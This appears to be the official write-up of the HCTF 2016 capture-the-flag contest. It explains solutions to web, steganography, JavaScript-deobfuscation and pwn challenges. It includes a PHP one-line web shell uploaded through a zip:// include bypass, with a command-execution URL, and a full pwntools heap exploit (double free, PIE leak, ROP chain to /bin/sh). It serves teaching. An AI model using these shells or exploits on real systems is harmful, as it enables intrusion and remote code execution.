        <div class="col-md-9" id="getWidth">
      <div class="article-wrap panel panel-default">
                    <div class="articlecontent">
        <div class="title">
          <h2> HCTF 2016网络攻防大赛官方Writeup </h2>
          <div class="property">
		  		  <span class="name"><a href="http://www.freebuf.com/author/sysorem" title="由 sysorem 发布" rel="author">sysorem</a></span>
		  		  <span class="icon-f"></span>
		  <span class="time">2016-12-05</span>
             
		  <span class="look">共<strong>22319</strong>人围观
              </span>          
		  <span class="tags">		  
		  <a href="http://www.freebuf.com/articles/web">WEB安全</a><a href="http://www.freebuf.com/articles/others-articles">其他</a></span>	
        <span class="tags_01"></span>			  
		  </div>
        </div>
                        <div id="contenttxt">
           <p><b>*本文原创作者：sysorem，本文属FreeBuf原创奖励计划，未经许可禁止转载 </b></p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806084705580.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="banner.png" data-original="http://image.3001.net/images/20161202/14806084705580.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/14806084705580.png!small" width="690" style="display: inline;"></a>    </p>
<noscript>&lt;img alt="banner.png" src="http://image.3001.net/images/20161202/14806084705580.png!small" width="690" height="515"&gt;    &lt;/p&gt;</noscript>
<p><b>2016年11月25日20:00 – 2016年11月27日20:00，历时48小时，第八届HCTF网络安全对抗赛正式完结。本次比赛由Vidar-Team全程提供技术支持，Vidar-Team成立于2016年9月，由一群热衷研究网络安全技术的小伙伴组成。</b>想了解更多关于Vidar-Team介绍，欢迎访问我们的<a href="https://wiki.vidar.club/" target="_blank">wiki</a>。</p>
<p>赛前我们做了各种准备，也经历了各种突发情况，总算是还算完美地给大家呈现了一场精彩的HCTF，不知道大家感觉怎么样，为了能够给大家带来一场更有趣的比赛，我们还是坚持使用了特殊的比赛规则，还用上了从Defcon学来的动态分数制度，虽然下层制度还有很多不完善，但仍希望大家能享受和传统竞赛不一样的乐趣。</p>
<p>稍稍总结一下整场比赛吧，报名队伍超过1800+，当然，由于xctftime的一些问题，很多队伍都是无效的，<b>成功登陆过的队伍有412支</b>，<b>完成杂项签到的队伍数为235</b>，<b>完成web签到题目的队伍数为226</b>，<b>结束时还在第一层的队伍有184</b>，<b>在第二层的有168</b>，<b>在第三层的有30</b>，<b>在第四层的有15支</b>，<b>能进入第五层的只有15支</b>。<b>唯二没有人解出来的题目是Crypto So Amazing和5-days</b>，<b>队伍AAA在开赛7小时第一个进入了第四层</b>，<b>队伍FlappyPig在开赛24小时第一个进入了第五层！</b>    </p>
<p>下面附上出题人的writeup(由于re已经公开了源码，下面的wp就不包括re部分了)</p>
<p><a href="https://github.com/hduisa/HCTF2016">题目源码</a></p>
<p>本次题目共分为5层 ，下面逐层奉上各位师傅的解题姿势。</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806087302545.jpg" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="levels.jpg" data-original="http://image.3001.net/images/20161202/14806087302545.jpg!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/14806087302545.jpg!small" width="690" style="display: inline;"></a>&nbsp;</p>
<noscript>&lt;img alt="levels.jpg" src="http://image.3001.net/images/20161202/14806087302545.jpg!small" width="690" height="364"&gt;&amp;nbsp;&lt;/p&gt;</noscript>
<h2><b># Level1 #</b></h2>
<h3>## 2099年的flag ##</h3>
<blockquote><p>题目描述：only ios99 can get flag(Maybe you can easily get the flag in 2099</p>
<p>最终分数：10pt</p>
<p>完成人数：226</p>
</blockquote>
<p>进去后发现这么一句话，相信有经验的人第一时间就能反应过来是要改ua。</p>
<p>这次比赛中总有感觉可能很多人不知道，Chrome的开发者工具(F12一下)里本身就能模拟手机访问，复制请求头中的ua，然后修改为ios99即可（ps：ios是iphone的系统）</p>
<h2></h2>
<h2></h2>
<h2></h2>
<h2># Level 2 #</h2>
<h3>## RESTFUL ##</h3>
<blockquote><p>题目描述：博丽神社赛钱箱</p>
<p>最终分数：34pt</p>
<p>完成人数：152</p>
</blockquote>
<p>其实题目是很简单的，熟悉Web开发的老司机应该都知道RESTFUL Webservice。</p>
<p>在RESTFUL下，传参方式改成了路由传参，也就是`\money\12345`就是传递了money=12345。</p>
<p>所以根据题意，锁定payload，贴心的Aklis大佬还自带了脚本</p>
<p style="text-align: center"><a href="http://image.3001.net/images/20161202/14806102674013.png" class="highslide-image" onclick="return hs.expand(this);" target="_blank"><img alt="10.png" data-original="http://image.3001.net/images/20161202/14806102674013.png!small" src="./HCTF 2016网络攻防大赛官方Writeup - FreeBuf.COM _ 关注黑客与极客_files/grey.gif" width="662"></a>     </p>
<noscript>&lt;img alt="10.png" src="http://image.3001.net/images/20161202/14806102674013.png!small" width="662" height="388"&gt;     &lt;/p&gt;</noscript>
<h3></h3>
<h3></h3>
<h3>## pic again ##<br></h3>
<p>出于平衡难度梯度的原则，所以出了道图片隐写，因为最近ichunxxx一条龙比赛越来越多，脑洞越来越大，索性就出了个标准的LSB隐写，为了不让题目太简单，我选择塞了一个压缩包进去</p>
<p>如果你要问怎么办，我只能放代码了，如果这个看不懂的话，你可能需要审视一下自己到底是被ctf玩还是玩ctf了</p>
<pre><code class="hljs cs"><span class="hljs-meta"># coding: utf-8</span>
<span class="hljs-keyword">from</span> PIL import Image


fflag = open(<span class="hljs-string">"justastart.zip"</span>,<span class="hljs-string">"rb"</span>)
flag = []

<span class="hljs-keyword">while</span> True:
	<span class="hljs-keyword">byte</span> = fflag.read(<span class="hljs-number">1</span>)
	<span class="hljs-keyword">if</span> <span class="hljs-keyword">byte</span> == <span class="hljs-string">""</span>:
		<span class="hljs-keyword">break</span>
	<span class="hljs-keyword">else</span>:
		hexstr = <span class="hljs-string">"%s"</span> % <span class="hljs-keyword">byte</span>.encode(<span class="hljs-string">"hex"</span>)
		decnum = <span class="hljs-keyword">int</span>(hexstr, <span class="hljs-number">16</span>)
		binnum = bin(<span class="hljs-keyword">int</span>(hexstr, <span class="hljs-number">16</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">8</span>)

		<span class="hljs-function"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params"><span class="hljs-number">8</span></span>):
			flag.<span class="hljs-title">append</span>(<span class="hljs-params">binnum[i:i+<span class="hljs-number">1</span>]</span>)

flag.<span class="hljs-title">reverse</span>(<span class="hljs-params"></span>)

im </span>= Image.open(<span class="hljs-string">'misc1.jpg'</span>)


width = im.size[<span class="hljs-number">0</span>]
height = im.size[<span class="hljs-number">1</span>]

pic = Image.new(<span class="hljs-string">"RGB"</span>,im.size)

<span class="hljs-function"><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params">height</span>):
	<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params">width</span>):

		pixel </span>= list(im.getpixel((x, y)))

		<span class="hljs-function"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params"><span class="hljs-number">3</span></span>):
			count </span>= pixel[i]%<span class="hljs-number">2</span>

			<span class="hljs-function"><span class="hljs-keyword">if</span> <span class="hljs-title">len</span>(<span class="hljs-params">flag</span>) </span>== <span class="hljs-number">0</span>:
				<span class="hljs-keyword">break</span>

			<span class="hljs-keyword">if</span> count == <span class="hljs-keyword">int</span>(flag.pop()):
				<span class="hljs-keyword">continue</span>

			<span class="hljs-keyword">if</span> count == <span class="hljs-number">0</span>:
				pixel[i]+=<span class="hljs-number">1</span>

			elif count == <span class="hljs-number">1</span>:
				pixel[i]-=<span class="hljs-number">1</span>

		pic.putpixel([x, y],tuple(pixel))

pic.save(<span class="hljs-string">"flag.png"</span>)</code></pre>
<p>顺手附上解密代码     </p>
<pre><code class="hljs cs"><span class="hljs-meta"># coding: utf-8</span>
<span class="hljs-keyword">from</span> PIL import Image

im = Image.open(<span class="hljs-string">'flag.png'</span>)


width = im.size[<span class="hljs-number">0</span>]
height = im.size[<span class="hljs-number">1</span>]

a = <span class="hljs-string">""</span>
aa = <span class="hljs-string">""</span>

<span class="hljs-function"><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params">height</span>):
	<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params">width</span>):

		pixel </span>= im.getpixel((x, y))

		<span class="hljs-function"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params"><span class="hljs-number">3</span></span>):
			aa +</span>= str(pixel[i]%<span class="hljs-number">2</span>)

<span class="hljs-function"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-title">xrange</span>(<span class="hljs-params">len(aa</span>)):
	<span class="hljs-keyword">try</span>:
		a +</span>= chr(<span class="hljs-keyword">int</span>(aa[i*<span class="hljs-number">8</span>:i*<span class="hljs-number">8</span>+<span class="hljs-number">8</span>],<span class="hljs-number">2</span>))
	except:
		<span class="hljs-keyword">break</span>

fflag = open(<span class="hljs-string">"test.zip"</span>,<span class="hljs-string">"w"</span>)

fflag.write(a)
fflag.close()

</code></pre>
<p>如果你还不清楚怎么发现lsb特征的话，你可能需要`Stegsolve`这个工具</p>
<h3>## gogogo ##</h3>
<blockquote><p>题目描述：上上下下左左右右baba</p></blockquote>
<p>打游戏而已，就简单的打游戏好了，金手指无敌过关就可以get flag。</p>
<p>有人问有没有逆向解法，事实上其实没有，游戏是通过`Tile Layer Pro`直接对图层的修改，比较特别，有兴趣的人可以去玩玩看</p>
<h3></h3>
<h3></h3>
<h3>## giligili ##</h3>
<p>题目是我很早以前做的sctf q1中的web500,我做的时候踩了坑，所以花了很久，感觉题目很有意思，所以就修改了题目又放上来了。</p>
<p><a href="https://github.com/sternze/CTF_writeups/blob/master/sCTF/2016_Q1/obfuscat/readme.md](https://github.com/sternze/CTF_writeups/blob/master/sCTF/2016_Q1/obfuscat/readme.md" target="_blank">正解wp</a> </p>
<p>最终分数：124</p>
<p>完成队伍：64</p>
<p>解题人数意外的多，感觉还是有很多py的人，迷…</p>
<p>分析代码</p>
<pre><code class="hljs markdown">h = new MersenneTwister(parseInt(btoa(answer[<span class="hljs-string">_[$[6</span>]]](0, 4)), 32));</code></pre>
<p>首先我们根据第一句得到h，h为一个伪随机的数组，根据前四位构成，所以flag的头hctf很重要。</p>
<p>紧接着很多伪随机数都成了固定的数字，也就便于分析了</p>
<pre><code class="hljs ini"><span class="hljs-attr">o</span> = answer.split(<span class="hljs-string">"_"</span>);</code></pre>
<p>这里把输入根据下划线分割得到o</p>
<pre><code class="hljs markdown"><p>e =- (this[<span class="hljs-string">_[$[42</span>]]](<span class="hljs-emphasis">_[$[31]](o[1])) ^ s[0]); if (-e != $[21]) return false;</span></p><p><span class="hljs-emphasis">e ^= (this[_</span>[<span class="hljs-string">$[42</span>]]](_[<span class="hljs-string">$[31</span>]](o[2])) ^ s[1]); if (-e != $[22]) return false; e -= 0x352c4a9b;</p></code></pre>
<p>根据这部分，相互异或得到了中间两部分的ascii码，这里其实分析逻辑容易进入误区，这里要肯定的是，其实flag一定是可显示的字符，所以肯定不可以是3位或更多位分割，这么一来就很容易确认了</p>
<p>代码到了这里</p>
<pre><code class="hljs markdown"><p>a += _[<span class="hljs-string">$[31</span>]](o[3].substring(o[3].length - 2)).split("x")[1];</p><p>//o[3]的最后两位</p><p>d = parseInt(a, 16) == (Math.pow(2, 16)+ -5+ "") + o[3].charCodeAt(o[3].length - 3).toString(16) + "53846" + (new Date().getFullYear()- +1+ "");</p></code></pre>
<p></p>
<p>出现了很多可变的东西，首先是a</p>
<p>a由o[0]和o[3]共同决定</p>
<pre><code class="hljs markdown">a = parseInt(<span class="hljs-emphasis">_[$[23]]("1", Math.max(o[0].length, o[3].length)), 3) ^ eval(_</span>[<span class="hljs-string">$[31</span>]](o[0]));</code></pre>
<p>其次a会在十进制的基础上，拼接上o[3]出大括号的后两位的十六进制，转十进制</p>
<p>`a += _[$[31]](o[3].substring(o[3].length – 2)).split(“x”)[1];`</p>
<p>和a相比较的后面的代码，其中有一个可变量为o[3]的倒数第三位，这里出现了隐藏条件</p>
<blockquote><p>1、中间的o[3]倒数第三位转十六进制后不允许存在字母</p>
<p>2、整体转16进制之后，除了后四位不能存在字母</p>
<p>3、倒数2位必须可显</p>
</blockquote>
<p>综合上面的条件，我们就需要脚本来解决问题了</p>
<pre><code class="hljs perl"><p><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">30</span>,<span class="hljs-number">120</span>):</p><p>	 <span class="hljs-keyword">if</span> <span class="hljs-string">'a'</span> <span class="hljs-keyword">not</span> in <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">5</span>]:</p><p>	 	<span class="hljs-keyword">if</span> <span class="hljs-string">'b'</span> <span class="hljs-keyword">not</span> in <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">5</span>]:</p><p>	 		<span class="hljs-keyword">if</span> <span class="hljs-string">'c'</span> <span class="hljs-keyword">not</span> in <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">5</span>]:</p><p>	 			<span class="hljs-keyword">if</span> <span class="hljs-string">'d'</span> <span class="hljs-keyword">not</span> in <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">5</span>]:</p><p>	 				<span class="hljs-keyword">if</span> <span class="hljs-string">'e'</span> <span class="hljs-keyword">not</span> in <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">5</span>]:</p><p>	 					<span class="hljs-keyword">if</span> <span class="hljs-string">'f'</span> <span class="hljs-keyword">not</span> in <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))[<span class="hljs-number">2</span>:-<span class="hljs-number">5</span>]:</p><p>							<span class="hljs-keyword">print</span> i</p><p>							<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))</p><p>							<span class="hljs-keyword">print</span> <span class="hljs-keyword">hex</span>(<span class="hljs-keyword">int</span>(<span class="hljs-string">"65531"</span> + repr(i) + <span class="hljs-string">"53846"</span> + <span class="hljs-string">"2015"</span>))[-<span class="hljs-number">5</span>:-<span class="hljs-number">1</span>]</p><p>							<span class="hljs-comment"># print chr(int(hex(int("65531" + repr(i) + "53846" + "2015"))[-5:-3],16))</span></p><p><span class="hljs-comment">							# print chr(int(hex(int("65531" + repr(i) + "53846" + "2015"))[-3:-1],16))</span></p></code></pre>
<p></p>
<p>下面我们得到了7条，紧接着，筛选可显示字符</p>
<p>只剩下3个了</p>
<pre><code class="hljs"><p>64</p>    <p>0x17481184783f3fL</p>    <p>3f3f</p></code></pre>
<p>只剩下这个了，那么最后二位是**??**,倒数第三位是**d**</p>
<p>那么我们现在还得到了o[3]和o[0]相关的关系，那么我们接下去看</p>
<pre><code class="hljs markdown"><p>i = 0xffff;</p>    <p>n = (f = <span class="hljs-emphasis">_[$[23]](o[3].charAt(o[3].length - 4), 3)) == o[3].substring(1, 4);</span></p><span class="hljs-emphasis">    </span><p><span class="hljs-emphasis">// f 是o[3]的倒数第4位重复3遍和o[3]234位相等</span></p><span class="hljs-emphasis">    </span><p><span class="hljs-emphasis">g = 3;</span></p><span class="hljs-emphasis">    </span><p><span class="hljs-emphasis">t = _</span>[<span class="hljs-string">$[23</span>]](o[3].charAt(3), 3) == o[3].substring(5, 8) &amp;&amp; o[3].charCodeAt(1) * o[0].charCodeAt(0) == 0x2ef3;</p>    <p>//o[3]的第四位重复三遍和o[3]的678位相同，o[3]第2位的阿斯克码-2×o[0]第1位的阿斯克码==0x2ef3</p></code></pre>
<p></p>
<p>这里我们拆解0x32ab得到119和101</p>
<p>得到两个字符分别为e和w,那么可以确定2位，但是不确定顺序</p>
<p>下面接着分析</p>
<pre><code class="hljs markdown"><p>i = 0xffff;</p>    <p>g = 3;</p>    <p>h = ((31249*g) &amp; i).toString(16);</p>    <p>i = _[<span class="hljs-string">$[31</span>]](o[3].split(f).join("").substring(0, 2)).split("x")[1];</p>    <p>s = i == h;</p></code></pre>
<p>这里的s判断给了我们新的信息，因为h已知，所以我们就能得到o[3]的第一位和第五位，这么一来，o[3]所有的位我们都知道了是</p>
<p>`neee3eeed??`</p>
<p>现在我们知道了长度，可以肯定的是，o[3]肯定比o[1]长，那么基本可以得到o[1]了，回到刚才的逻辑</p>
<pre><code class="hljs markdown">a = parseInt(<span class="hljs-emphasis">_[$[23]]("1", Math.max(o[0].length, o[3].length)), 3) ^ eval(_</span>[<span class="hljs-string">$[31</span>]](o[0]));</code></pre>
<p>这里我们得到的o[0]为`h3r3`, 特别的是，我们刚才得到o[0]第一位为w，这里有个小坑，由于`parseInt(_[$[23]](“1″, Math.max(o[0].length, o[3].length)), 3)`过小，所以异或没有影响到所有的位，根据意思，我们加上了w，那么getflag</p>
<pre><code class="hljs">hctf{wh3r3_iz_y0ur_neee3eeed??}</code></pre>
<h3></h3>
<h3></h3>
<h3>## 兵者多诡 ##</h3>
<p>进去后发现是个上传图片的网站，这里可能存在文件上传漏洞</p>
<p>先随便上传一个文件进去，提示 `只能上传PNG图片`，猜测可能对文件后缀名做了检测。经过测试后发现上传的文件都被强制改了后缀 .png，`%00`截断的方法因已经修复不能用了。</p>
<p>我们回来看下这里的 fp 参数其实很明显，代表包含文件的文件名，可以采用<a href="http://php.net/manual/zh/wrappers.php.php">PHP协议</a>来读 php 文件源码</p>
<pre><code class="hljs dts"><p><a href="http://pics.hctf.io/home.php?fp=php://filter/read=convert.base64-encode/resource=home"><span class="hljs-symbol">http:</span><span class="hljs-comment">//pics.hctf.io/home.php?fp=php://filter/read=convert.base64-encode/resource=home</span></a></p></code></pre>
<p>可以发现对上传的文件类型做了检测</p>
<pre><code class="hljs cs"><p><span class="hljs-keyword">if</span>($type !== <span class="hljs-string">'image/png'</span>)
{</p><p>	?&gt;</p><p>	&lt;div <span class="hljs-keyword">class</span>=<span class="hljs-string">"alert alert-danger"</span> role=<span class="hljs-string">"alert"</span>&gt;只能上传PNG图片&lt;/div&gt;</p><p>	&lt;?php</p><p>	exit;</p><p>}</p></code></pre>
<p>而且改了后缀名</p>
<pre><code class="hljs perl"><p>move_uploaded_file($name,<span class="hljs-string">"uploads/$imagekey.png"</span>);</p></code></pre>
<p>这时候我们可以通过 zip/phar伪协议 来包含文件</p>
<pre><code class="hljs dts"><p><span class="hljs-symbol">zip:</span><span class="hljs-comment">//xxx.png%23shell</span></p><p><span class="hljs-comment">phar://xxx.png/shell</span></p></code></pre>
<p>首先随便写个 php 文件</p>
<pre><code class="hljs xml"><p><span class="php"><span class="hljs-meta">&lt;?php</span></span></p><p><span class="php"> $_GET[<span class="hljs-string">'a'</span>]($_GET[<span class="hljs-string">'b'</span>]);</span></p><p><span class="php"><span class="hljs-meta">?&gt;</span></span></p></code></pre>
<p>然后压缩，重命名为 shell.png 来绕过上传检测，这样我们就 getshell 了</p>
<pre><code class="hljs dts"><p><a href="http://pics.hctf.io/home.php?fp=zip://uploads/515969bfe90c2f52fbcd7e5818e8688b681eea4e.png%23shell&amp;a=system&amp;b=ls"><span class="hljs-symbol">http:</span><span class="hljs-comment">//pics.hctf.io/home.php?fp=zip://uploads/515969bfe90c2f52fbcd7e5818e8688b681eea4e.png%23shell&amp;a=system&amp;b=ls</span></a></p></code></pre>
<p></p>
<p>最后 flag 在上层目录下的一个 php 文件里</p>
<h3></h3>
<h3></h3>
<h3>## 就是干 ##</h3>
<p>这一题算是Hctf中最简单的一个pwn题。但是由于hctf的pwn题普遍不怎么友好。所以这一题也是相当的有难度的题目。</p>
<p>漏洞的触发条件其实很简单，因为这一题的出题思路和题目一样，纯粹的逆向技巧的利用。在delete的时候没有校验这块内存是否被释放过造成的一个double free。因为申请的堆块比较小，所以只能用uaf去解出这一题。</p>
<p>而且我在堆上面布置了一个函数指针，所以使用uaf去覆盖这个函数指针就可以达到任意跳转。</p>
<p><b>### 0×01 uaf构造</b></p>
<pre><code class="hljs sql"><p><span class="hljs-keyword">create</span>(<span class="hljs-number">4</span>, <span class="hljs-string">'aaa\n'</span>)</p><p><span class="hljs-keyword">create</span>(<span class="hljs-number">4</span>, <span class="hljs-string">'aaa\n'</span>)</p><p><span class="hljs-keyword">delete</span>(<span class="hljs-number">0</span>)</p><p><span class="hljs-keyword">delete</span>(<span class="hljs-number">1</span>)</p><p><span class="hljs-keyword">delete</span>(<span class="hljs-number">0</span>)</p><p><span class="hljs-keyword">create</span>(<span class="hljs-number">4</span>, <span class="hljs-string">'\x00'</span>)</p><p><span class="hljs-keyword">create</span>(<span class="hljs-number">0x20</span>, <span class="hljs-string">'a'</span> * <span class="hljs-number">0x16</span> + <span class="hljs-string">'lo'</span> + <span class="hljs-string">'\x2d\x00'</span>)</p><p><span class="hljs-keyword">delete</span>(<span class="hljs-number">0</span>)</p></code></pre>
<p>poc中使用了两次creat创建了两个大小一样的fastheap的结构，然后利用了fastheap使用单项链表连接并且不检查double free的特点对两个堆块依次释放，其中第一块我先后释放了两次，这样子会使得fastbin链表变成一个循环链表。再以适当的方式申请内存，就可以使得字符串缓冲区和带有函数指针的控制块重合，使覆盖函数指针成为可能。</p>
<p><b>### 0×02 绕过pie</b></p>
<p>为了绕过pie，需要leak出一个指向ELF文件的地址。正好，堆上就有这样一个函数指针。而且pie保护开启的话，地址的最后一位还是不变的。所以可以通过覆盖一个字节的函数指针最低位，使得本来调用delete函数的指针跳转到一个既能leak出地址，又不能使得程序崩溃的地方。</p>
<p>这里的这一条调用put的语句正好可以leak出堆上的指针，因为本来调用delete的时候，rdi是设置为内存的地址的，而且这一句puts语句正好main函数的死循环中，因为不会retuen，所以不会因为栈不平衡而崩溃。正好可以用来leak出程序的加载地址。</p>
<p><b>### 0×03 利用ROP</b></p>
<p>光光控制一个函数指针还是不能获得shell的，还需要得到libc的加载地址。所以还是需要构造ROP。</p>
<pre><code class="hljs objectivec"><p><span class="hljs-keyword">void</span> deleteStr() {</p><p> <span class="hljs-keyword">int</span> <span class="hljs-keyword">id</span>;</p><p> <span class="hljs-keyword">char</span> buf[<span class="hljs-number">0x100</span>];</p><p> printf(<span class="hljs-string">"Pls give me the string id you want to delete\nid:"</span>);</p><p> <span class="hljs-keyword">id</span> = getInt();</p><p> <span class="hljs-keyword">if</span> (<span class="hljs-keyword">id</span> &lt; <span class="hljs-number">0</span> || <span class="hljs-keyword">id</span> &gt; <span class="hljs-number">0x10</span>) {</p><p> printf(<span class="hljs-string">"Invalid id\n"</span>);</p><p> }</p><p> <span class="hljs-keyword">if</span> (Strings[<span class="hljs-keyword">id</span>].str) {</p><p> printf(<span class="hljs-string">"Are you sure?:"</span>);</p><p> read(STDIN_FILENO,buf,<span class="hljs-number">0x100</span>);</p><p> <span class="hljs-keyword">if</span>(strncmp(buf,<span class="hljs-string">"yes"</span>,<span class="hljs-number">3</span>)) {</p><p> <span class="hljs-keyword">return</span>;</p><p> }</p><p> Strings[<span class="hljs-keyword">id</span>].str-&gt;free(Strings[<span class="hljs-keyword">id</span>].str);</p><p> Strings[<span class="hljs-keyword">id</span>].inuse = <span class="hljs-number">0</span>;</p><p> }</p><p>}</p></code></pre>
<p></p>
<p>所以我在delete的代码中，在调用函数指针之前特意在栈里留了一大块可以任意构造的缓冲区，就是为了覆盖函数指针为一个连续的pop;pop;ret指令，使得rsp指针迁移到一段rop上成为可能。这样就可以使用rop来完成任何想做的事情了。</p>
<p><b>### 0×04获取shell</b></p>
<p>我的poc中并没有用DynELF搜索libc的操作，毕竟出题人自己写poc的时候是可以开挂的。不过如果是选手做题，就需要通过ROP构造一个任意地址读来获取system地址了。不过还是有比较灵性的人猜出了服务器环境，直接找到了对应的libc。总的来说，libc不是一个很大的障碍。</p>
<pre><code class="hljs ruby"><p><span class="hljs-comment">#! /usr/bin/python</span></p><p><span class="hljs-comment">from pwn import *</span></p><p><span class="hljs-comment">context.log_level = 'debug'</span></p><p><span class="hljs-comment">target = process('pwn-f')</span></p><p><span class="hljs-comment">def create(size, string):</span></p><p><span class="hljs-comment"> target.recvuntil('quit')</span></p><p><span class="hljs-comment"> target.sendline('create ')</span></p><p><span class="hljs-comment"> target.recvuntil('size:')</span></p><p><span class="hljs-comment"> target.sendline(str(size))</span></p><p><span class="hljs-comment"> target.recvuntil('str:')</span></p><p><span class="hljs-comment"> target.send(string)</span></p><p><span class="hljs-comment">def delete(id):</span></p><p><span class="hljs-comment"> target.recvuntil('quit')</span></p><p><span class="hljs-comment"> target.sendline('delete ')</span></p><p><span class="hljs-comment"> target.recvuntil('id:')</span></p><p><span class="hljs-comment"> target.sendline(str(id))</span></p><p><span class="hljs-comment"> target.recvuntil('sure?:')</span></p><p><span class="hljs-comment"> target.sendline('yes')</span></p><p><span class="hljs-comment">create(4, 'aaa\n')</span></p><p><span class="hljs-comment">create(4, 'aaa\n')</span></p><p><span class="hljs-comment">delete(0)</span></p><p><span class="hljs-comment">delete(1)</span></p><p><span class="hljs-comment">delete(0)</span></p><p><span class="hljs-comment">create(4, '\x00')</span></p><p><span class="hljs-comment">create(0x20, 'a' * 0x16 + 'lo' + '\x2d\x00')</span></p><p><span class="hljs-comment">delete(0)</span></p><p><span class="hljs-comment">target.recvuntil('lo')</span></p><p><span class="hljs-comment">addr = target.recvline()</span></p><p><span class="hljs-comment">addr = addr[:-1]</span></p><p><span class="hljs-comment">addr = u64(addr + '\x00' * (8 - len(addr))) - 0xd2d</span></p><p><span class="hljs-comment">delete(1)</span></p><p><span class="hljs-comment">create(4, '\x00')</span></p><p><span class="hljs-comment">target.recvuntil('quit')</span></p><p><span class="hljs-comment">target.sendline('create ')</span></p><p><span class="hljs-comment">target.recvuntil('size:')</span></p><p><span class="hljs-comment">target.sendline(str(0x20))</span></p><p><span class="hljs-comment">target.recvuntil('str:')</span></p><p><span class="hljs-comment">target.send('a' * 0x18 + p64(0x00000000000011DC + addr))</span></p><p><span class="hljs-comment">print hex(addr)</span></p><p><span class="hljs-comment">target.recvuntil('quit')</span></p><p><span class="hljs-comment">target.sendline('delete ')</span></p><p><span class="hljs-comment">target.recvuntil('id:')</span></p><p><span class="hljs-comment">target.sendline('1')</span></p><p><span class="hljs-comment">target.recvuntil('sure?:')</span></p><p><span class="hljs-comment">ropchain = p64(addr + 0x00000000000011e3) # pop rdi</span></p><p><span class="hljs-comment">ropchain += p64(addr + 0x202070)# got<span class="hljs-doctag">@malloc</span></span></p><p><span class="hljs-comment"><span class="hljs-doctag">ropchain</span> += p64(addr + 0x0000000000000990)# plt<span class="hljs-doctag">@put</span></span></p><p><span class="hljs-comment"><span class="hljs-doctag">ropchain</span> += p64(addr + 0x00000000000011e3)# pop rdi</span></p><p><span class="hljs-comment">ropchain += p64(1)</span></p><p><span class="hljs-comment">ropchain += p64(addr + 0x00000000000011DA)# magic</span></p><p><span class="hljs-comment">ropchain += p64(0)# rbx</span></p><p><span class="hljs-comment">ropchain += p64(1)# rbp</span></p><p><span class="hljs-comment">ropchain += p64(addr + 0x0000000000202058)# r12 -&gt; rip got<span class="hljs-doctag">@read</span></span></p><p><span class="hljs-comment"><span class="hljs-doctag">ropchain</span> += p64(8)# r13 -&gt; rdx</span></p><p><span class="hljs-comment">ropchain += p64(addr + 0x0000000000202078)# r14 -&gt; rsi got<span class="hljs-doctag">@atoi</span></span></p><p><span class="hljs-comment"><span class="hljs-doctag">ropchain</span> += p64(0)# r15 -&gt; rdi</span></p><p><span class="hljs-comment">ropchain += p64(addr + 0x00000000000011C0)# magic</span></p><p><span class="hljs-comment">ropchain += 'a'*8*7</span></p><p><span class="hljs-comment">ropchain += p64(addr + 0x0000000000000B65)# getInt</span></p><p><span class="hljs-comment">target.sendline('yes ' + ropchain)</span></p><p><span class="hljs-comment">addr = target.recvline()[:-1]</span></p><p><span class="hljs-comment">addr = u64(addr + '\x00' * (8 - len(addr)))</span></p><p><span class="hljs-comment">#addr = addr - 534112 + 288144</span></p><p><span class="hljs-comment">addr = addr - 537984 + 283536</span></p><p><span class="hljs-comment">print hex(addr)</span></p><p><span class="hljs-comment">target.sendline(p64(addr)+'/bin/sh')</span></p><p><span class="hljs-comment">target.interactive()</span></p></code></pre>
<h3></h3>
<h3></h3>
<h3>## Crypto So Interesting ##</h3>
